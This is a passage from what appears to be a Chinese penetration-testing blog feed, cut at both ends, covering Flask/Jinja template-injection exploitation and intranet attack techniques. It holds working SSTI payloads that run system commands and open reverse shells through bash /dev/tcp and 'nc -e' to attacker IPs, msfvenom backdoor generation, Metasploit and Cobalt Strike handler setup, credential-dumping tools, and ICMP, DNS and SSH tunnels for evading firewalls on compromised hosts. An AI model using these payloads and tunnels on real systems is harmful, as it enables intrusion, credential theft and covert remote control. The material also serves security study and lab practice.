class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用代码分析</span></span><br><span class=\"line\">import flask</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">app = flask.Flask(__name__)</span><br><span class=\"line\">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/&#x27;)</span><br><span class=\"line\">def index():</span><br><span class=\"line\">  return open(__file__).read()</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class=\"line\">def shrine(shrine):</span><br><span class=\"line\">  def safe_jinja(s):</span><br><span class=\"line\">    s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">    blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class=\"line\">    return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s #&#x27;&#123;% set config=None%&#125;&#123;% set self=None%&#125;&#x27;+s</span><br><span class=\"line\">  return flask.render_template_string(safe_jinja(shrine))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">  app.run(debug=True)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>url_for () 函数是用于构建操作指定函数的 URL, url_fo 会返回视图函数对应的 URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入<br>\n <code>/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</code> <br>\n <code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></p>\n</li>\n<li>\n<p>get_flashed_messages () 函数是获取传递过来的数据，返回之前在 Flask 中通过 flash () 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages () 方法取出 (闪现信息只能取出一次，取出后闪现信息会被清空)。<br>\n <code>/shrine/&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</code> <br>\n <code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></p>\n</li>\n</ul>\n<h4 id=\"ssti-反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#ssti-反弹shell\">#</a> SSTI 反弹 shell</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">常用来确定是否存在SSTI漏洞的payload：</span></span><br><span class=\"line\">http://192.168.31.60:9999/?name=&#123;&#123;2*2&#125;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">py一句话引入os调用系统命令执行<span class=\"built_in\">id</span>：</span></span><br><span class=\"line\">http://192.168.31.60:9999/?name=&#123;%%20import%20os%20%&#125;&#123;&#123;os.system(%27id% 27)&#125;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">py一句话引入os.popen的方式调用系统命令：</span></span><br><span class=\"line\">http://192.168.31.17:5000/sh4d0w\\$s?l333tt=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&#125;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">py通过os.system调用bash反弹shell：</span></span><br><span class=\"line\">http://192.168.31.60:9999/?name= &#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp;/dev/tcp/192.168.31.135/4446 &gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">py通过os.popen的方式调用nc反弹shell：</span></span><br><span class=\"line\">http://192.168.31.17:5000/sh4d0w\\$s?&#123;&#123;%20config.__class__.__init__.__globals__[%27os%7].popen(%27nc%20192.168.31.99%204444%20-e%20/bin/bash%27).read()%20&#125;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">py反弹shell失败时可尝试用urlencode编码绕过：</span></span><br><span class=\"line\">http://www.jsons.cn/urlencode</span><br><span class=\"line\">http://192.168.31.11:9999/?name=%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.135%2F4444%200%3E%261%2%27)%7D%7D</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果能在服务器中写文件，可写入文件，用py调用此文件执行后反弹shell：</span></span><br><span class=\"line\">echo -e &quot;#! /bin/bash\\nbash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.83/4444 0&gt;&amp;1&#x27;&quot; &gt; /tmp/shell.sh http://127.0.0.1:8787/?name=&#123;&#123;request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cd%20/tmp/;bash%20shell.sh%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/",
            "title": "XD22 11 内网安全",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<p>局域网：小型办公室，家里<br>\n工作组：学校机房，网吧<br>\n内网域：大型机器组成的内网，域控即主控制器可以管理电脑，负责下发任务和统一管理，对所有的机器进行软件安装、环境部署</p>\n<p>域用户 whoami 会显示 DC 名字而不是主机名，此时去下载软件受限于域控，如果域控未开通域成员下载软件的功能，则域成员下载软件时需要征得域控的同意。此时如果切换为普通用户，即 whoami 显示主机名时可以下载软件，将不受域控的管理限制。</p>\n<h3 id=\"域信息收集\"><a class=\"markdownIt-Anchor\" href=\"#域信息收集\">#</a> 域信息收集</h3>\n<ul>\n<li>一些注意事项</li>\n</ul>\n<p>（ 1 ）linux 可以成为一个域成员主机，在域内环境并不常见。</p>\n<p>（ 2 ）域内有 DNS 服务器做解析，由域控分配解析规则，不允许在互联网解析。</p>\n<p>（ 3 ）判断是否在域内<br>\n <code>net view /domain</code>  判断存在域<br>\n <code>net time /domain</code>  判断主域</p>\n<p>（ 4 ）获取域控 ip<br>\n <code>net time /domain</code>  获取域控时间，ping 此命令返回的域控名得到域控 ip</p>\n<h4 id=\"应用-服务-权限收集\"><a class=\"markdownIt-Anchor\" href=\"#应用-服务-权限收集\">#</a> 应用 服务 权限收集</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systeminfo 详细信息</span><br><span class=\"line\">netstat -ano 端口列表</span><br><span class=\"line\">route print 路由表</span><br><span class=\"line\">net start 启动服务</span><br><span class=\"line\">tasklist 进程列表</span><br><span class=\"line\">schtasks 计划任务</span><br><span class=\"line\">ipconfig /all 判断存在域</span><br><span class=\"line\">netstat -ano 当前网络端口开放</span><br><span class=\"line\">nslookup 域名 追踪来源地址</span><br><span class=\"line\">wmic service list brief 查询本机服务</span><br><span class=\"line\">net config workstation 查询当前登录域及登录用户信息</span><br><span class=\"line\">wmic startup get command,caption 查看已启动的程序信息</span><br></pre></td></tr></table></figure>\n<h4 id=\"网络-用户-域控收集\"><a class=\"markdownIt-Anchor\" href=\"#网络-用户-域控收集\">#</a> 网络 用户 域控收集</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net view /domain 查询域列表</span><br><span class=\"line\">net time /domain 从域控查询时间，若当前用户是域用户会从域控返回当前时间，亦用来判 断主域，主域一般用做时间服务器</span><br><span class=\"line\">net localgroup administrators 本机管理员【通常含有域用户】</span><br><span class=\"line\">net user /domain 查询域用户(当前域)</span><br><span class=\"line\">net group /domain 查询域工作组</span><br><span class=\"line\">net group &quot;domain computers&quot; /domain 查看加入域的所有计算机名</span><br><span class=\"line\">net group &quot;domain admins&quot; /domain 查询域管理员用户组和域管用户</span><br><span class=\"line\">net localgroup administrators /domain 查看域管理员</span><br><span class=\"line\">net group &quot;domain controllers&quot; /domain 查看域控</span><br><span class=\"line\">net accounts /domain 查看域密码策略</span><br></pre></td></tr></table></figure>\n<h4 id=\"密码-凭据-口令收集\"><a class=\"markdownIt-Anchor\" href=\"#密码-凭据-口令收集\">#</a> 密码 凭据 口令收集</h4>\n<p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>\n计算机用户 HASH，明文获取 - mimikatz (win)，mimipenguin (linux)<br>\n 计算机各种协议服务口令获取 - LaZagne (all)，XenArmor (win)，CS 插件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHov\">https://github.com/gentilkiwi/mimikatz/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmUv\">https://github.com/AlessandroZ/LaZagne/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2h1bnRlcmdyZWdhbC9taW1pcGVuZ3Vpbg==\">https://github.com/huntergregal/mimipenguin</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ZW5hcm1vci5jb20vYWxsaW5vbmUtcGFzc3dvcmQtcmVjb3ZlcnktcHJvLXNvZnR3YXJlLw==\">https://xenarmor.com/allinone-password-recovery-pro-software/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（ 1 ）站点源码备份文件、数据库备份文件等</span><br><span class=\"line\">（ 2 ）各类数据库Web管理入口，如PHPMyAdmin</span><br><span class=\"line\">（ 3 ）浏览器保存密码、浏览器Cookies</span><br><span class=\"line\">（ 5 ）其他用户会话、 3389 和ipc$连接记录、回收站内容</span><br><span class=\"line\">（ 6 ）Windows 保存的WIFI密码</span><br><span class=\"line\">（ 7 ）网络内部的各种帐号和密码，如：Email、VPN、FTP、OA等</span><br><span class=\"line\">````</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"><span class=\"comment\">### 自动化工具探针</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">工具只是辅助，实际过程中涉及到的问题繁多，需要配合手动解决各种问题。</span><br><span class=\"line\"></span><br><span class=\"line\">https://github.com/k8gege/LadonGo</span><br><span class=\"line\">https://github.com/BloodHoundAD/BloodHound</span><br><span class=\"line\">http://www.joeware.net/freetools/tools/adfind/index.htm</span><br><span class=\"line\"></span><br><span class=\"line\">CS插件：LSTAR Ladon OLa TaoWu等</span><br><span class=\"line\"></span><br><span class=\"line\">- Adfind</span><br><span class=\"line\"></span><br><span class=\"line\">```shell</span><br><span class=\"line\">列出域控制器名称：AdFind -sc dclist</span><br><span class=\"line\">查询当前域中在线的计算机：AdFind -sc computers_active</span><br><span class=\"line\">查询当前域中在线的计算机(只显示名称和操作系统)：</span><br><span class=\"line\">AdFind -sc computers_active name operatingSystem</span><br><span class=\"line\">查询当前域中所有计算机：AdFind -f &quot;objectcategory=computer&quot;</span><br><span class=\"line\">查询当前域中所有计算机(只显示名称和操作系统)：</span><br><span class=\"line\">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem</span><br><span class=\"line\">查询域内所有用户：AdFind -users name</span><br><span class=\"line\">查询所有GPO：AdFind -sc gpodmp</span><br></pre></td></tr></table></figure>\n<ul>\n<li>BloodHound 域分析使用</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NuLXNlYy5jb20vYXJjaGl2ZXMvMTQ2NTQ4Lmh0bWw=\">http://cn-sec.com/archives/146548.html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5k\">https://github.com/BloodHoundAD/BloodHound</span></p>\n<p>攻击机启动 neo4j 数据库 neo4j.bat console、内网启动 BloodHound 收集信息 SharpHound.exe -c all 生成 zip 文件、运行 BloodHound.exe 后将生成数据导入，筛选查看。</p>\n<h3 id=\"隧道技术\"><a class=\"markdownIt-Anchor\" href=\"#隧道技术\">#</a> 隧道技术</h3>\n<h4 id=\"隧道基础理论\"><a class=\"markdownIt-Anchor\" href=\"#隧道基础理论\">#</a> 隧道基础理论</h4>\n<ul>\n<li>相关名词解释</li>\n</ul>\n<p>隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）<br>\n代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）<br>\n域控防火墙更新策略：域控通过强制按钮或域内用户用 gpupdate/force 更新域控防火墙设置</p>\n<ul>\n<li>域控防火墙 - 组策略不出网上线</li>\n</ul>\n<p>域控通过组策略设置防火墙规则同步后，域内用户主机被限制 TCP 出网，其中规则为出站规则，安全研究者通过入站取得 SHELL 权限，需要对其进行上线控制。可利用正向连接或者隧道技术来实现。</p>\n<p>tcp 转 ICMP 协议出网在返回 tcp 协议项目：<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9zcHA=\">https://github.com/esrrhs/spp</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JkYW1lbGUvaWNtcHNo\">https://github.com/bdamele/icmpsh</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9waW5ndHVubmVs\">https://github.com/esrrhs/pingtunnel</span></p>\n<ul>\n<li>使用出网协议建立隧道</li>\n</ul>\n<p>SMB 隧道： 445 通讯、借助通讯后绑定上线、直接 SMB 协议通讯即可<br>\n ICMP 隧道：ping 命令、借助项目 (icmpsh icmptunnel pingtunnel) 通讯<br>\n DNS 隧道：nslookup dig、内网主机只出网 DNS 协议数据，<br>\nSSH 隧道：由于 cs 无 SSH 协议监听器配置，无法上线</p>\n<p>域名申请及配置 ns 解析记录、监听器创建选择 DNS 解析及其地址、后门绑定监听器，肉鸡执行 DNS 设置的木马上线主机，是一个 unknown 的主机，输入相关命令后成功上线。</p>\n<h4 id=\"icmp-隧道\"><a class=\"markdownIt-Anchor\" href=\"#icmp-隧道\">#</a> icmp 隧道</h4>\n<ul>\n<li>cs 控制 tcp 被禁用的域内主机</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">跳板机开启隧道</span></span><br><span class=\"line\">./pingtunnel -type server</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">肉鸡(管理器运行)</span></span><br><span class=\"line\">pingtunnel.exe -type client -l 127.0.0.1:6666 -s 192.168.46.66 -t 192.168.46.66:7777 -tcp 1 -noprint 1 -nolog 1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CS监听器</span></span><br><span class=\"line\">127.0.0.1 6666 192.168.46.66 7777</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成第一个监听器的Stager后门肉鸡执行后上线第二个监听器的马肉鸡将流经本地tcp流量的 6666 端口以icmp流量的方式转发至跳板机的 7777 端口，并且不输出任何日志，跳板机负责接收此流量。cs 的木马监听器从跳板机的 7777 端口处获取到肉鸡的反弹shell。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>msf 控制 tcp 被禁用的域内主机</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成后门</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 - f exe &gt; xd.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF启动监听</span></span><br><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">exploit</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Kali开启隧道</span></span><br><span class=\"line\">./pingtunnel -type server</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Win 开启隧道(管理员运行)</span></span><br><span class=\"line\">pingtunnel.exe -type client -l 127.0.0.1:3333 -s 192.168.46.66 -t 192.168.46.66:4444 -tcp 1 -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>\n<h4 id=\"dns-隧道\"><a class=\"markdownIt-Anchor\" href=\"#dns-隧道\">#</a> dns 隧道</h4>\n<p>（ 1 ）前提条件<br>\n使用场景：内网主机只出网 DNS 协议数据<br>\n项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lhcnJpY2svaW9kaW5l\">https://github.com/yarrick/iodine</span><br>\n 判断出网：nslookup <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb20=\">http://www.baidu.com</span></p>\n<p>（ 2 ）设置方法</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">服务器：设置密码xiaodi并创建虚拟IP及绑定域名指向</span></span><br><span class=\"line\">iodined -f -c -P xiaodi 192.168.0.1 ns1.xiaodi8.com -DD</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">客户端：连接密码xiaodi并绑定域名指向</span></span><br><span class=\"line\">iodine -f -M 200 -P xiaodi ns1.xiaodi8.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">尝试通讯尝试连接：</span></span><br><span class=\"line\">ssh root@192.168.0.2</span><br></pre></td></tr></table></figure>\n<p>（ 3 ）结果<br>\n会在外网主机上建立一块名为 192.168.0.1 的网卡，并且密码是 xiaodi。在内网主机上有一块 192.168.0.2 的 ip 地址，可以让外网直接访问。即外网通过新生成的 DNS 隧道访问到内网机器，一般用来控制 linux 的 ssh，在 windows 上使用时需安装 openvpn。</p>\n<h4 id=\"ssh-隧道\"><a class=\"markdownIt-Anchor\" href=\"#ssh-隧道\">#</a> ssh 隧道</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启ssh协议登录</span></span><br><span class=\"line\">vi /etc/ssh/sshd_config</span><br><span class=\"line\">PermitRootLogin yes</span><br><span class=\"line\">PasswordAuthentication yes</span><br><span class=\"line\">/etc/init.d/ssh start</span><br><span class=\"line\">/etc/init.d/ssh restart</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">本地 8080 流量转发至跳板机 1122 ，解决出站规则限制问题</span></span><br><span class=\"line\">ssh -CfNg -L 1122:192.168.1.15:8080 root@192.168.1.166</span><br><span class=\"line\">curl http://127.0.0.1:1122</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">本地 8080 流量转发至跳板机 1234 ，解决入站规则限制问题</span></span><br><span class=\"line\">ssh -CfNg -R 1234:192.168.1.15:8080 root@47.94.236.117</span><br><span class=\"line\">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure>\n<h3 id=\"代理技术\"><a class=\"markdownIt-Anchor\" href=\"#代理技术\">#</a> 代理技术</h3>\n<h4 id=\"跳板机间接控制\"><a class=\"markdownIt-Anchor\" href=\"#跳板机间接控制\">#</a> 跳板机间接控制</h4>\n<p>控制跳板机后，右键设置代理端口<br>\n命令：socks 59578<br>\n 操作：通过 profixier 设置代理服务器及代理规则后可以访问刀内网资产</p>\n<h4 id=\"msf-正向控制\"><a class=\"markdownIt-Anchor\" href=\"#msf-正向控制\">#</a> msf 正向控制</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成后门</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=3333 -f exe &gt; bd.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">让不出网的机器去执行这个正向连接的后门:</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/bind_tcp</span><br><span class=\"line\">set rhost 192.168.11.129</span><br><span class=\"line\">set lport 3333</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h4 id=\"cs-正向控制\"><a class=\"markdownIt-Anchor\" href=\"#cs-正向控制\">#</a> cs 正向控制</h4>\n<p>CS 控制上线 - 正向连接</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听器设置正向连接</span></span><br><span class=\"line\">bind_tcp port</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成监听器为正向连接的后门供不出网肉鸡执行</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">打开会话交互连接不出网主机正向连接的shell</span></span><br><span class=\"line\">connect ip port</span><br></pre></td></tr></table></figure>\n<h4 id=\"不出网机器上线\"><a class=\"markdownIt-Anchor\" href=\"#不出网机器上线\">#</a> 不出网机器上线</h4>\n<p><img data-src=\"/N1h1l157/Safe/image-001.png\" alt></p>\n<ul>\n<li>windows 2008 机器的控制</li>\n</ul>\n<p>在控制 windows 10 的基础上，此时已经用 cs 上线此机器。通过 windows 2008 做反向连接到 windows 10 上，并在 window 10 上做端口转发。右键 windows 选择转发上线，生成木马，供 2008 执行获取其权限。</p>\n<ul>\n<li>windows 2012 机器的控制</li>\n</ul>\n<p>如果采用正向连接，因为其本身采用了入站限制，无法突破。<br>\n如果采用反向连接，因为 windows 2008 采用了入站限制，仍无法突破。</p>\n<p>如果用 pingtunnel 将 tcp 流量转为 icmp 出 windows 2012 ，无法突破 windows 2008 的入站。因为到了 windows 2008 处时流量变成了 tcp，仍被限制。<br>\n因为开了打印机服务，可以通过 smb 即文件共享协议来进行上线。</p>\n<p>创建 smb 的监听器，防火墙允许 smb 就可以借助 smb 管道，配合 smb 的横向移动利用，psexec 64 进行操作，前提是获取到其账户密码。</p>\n<ul>\n<li>防火墙限制绕过</li>\n</ul>\n<p>入站过滤上线：隧道技术正向硬刚、反向连接跳过、防火墙开关，删除规则，替换程序。<br>\n出站过滤上线：隧道技术反向硬刚、正向连接跳过、防火墙开关，删除规则，替换程序。<br>\n两者都有：smb 是否开启，进行 smb 隧道上线</p>\n<p>实际环境中两种方法都测试判断是入站还是出站限制或者两者都有<br>\n第三种方案：单纯的内网环境、单纯的内网域环境（域控没有设置组策略防火墙同步）</p>\n<h3 id=\"内网穿透上线\"><a class=\"markdownIt-Anchor\" href=\"#内网穿透上线\">#</a> 内网穿透上线</h3>\n<ul>\n<li>穿透的作用</li>\n</ul>\n<p>旨在代理连接肉鸡后实现本地渗透肉鸡网络架构<br>\n（ 1 ）流量代理工具：Proxychains Proxifier<br>\n（ 2 ）穿透项目：Ngrok Frp Spp Nps</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmdyb2suY2M=\">https://www.ngrok.cc</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9zcHA=\">https://github.com/esrrhs/spp</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==\">https://github.com/fatedier/frp</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VoYW5nLWlvL25wcw==\">https://github.com/ehang-io/nps</span></p>\n<h4 id=\"ngrok-上线内网机器\"><a class=\"markdownIt-Anchor\" href=\"#ngrok-上线内网机器\">#</a> Ngrok 上线内网机器</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 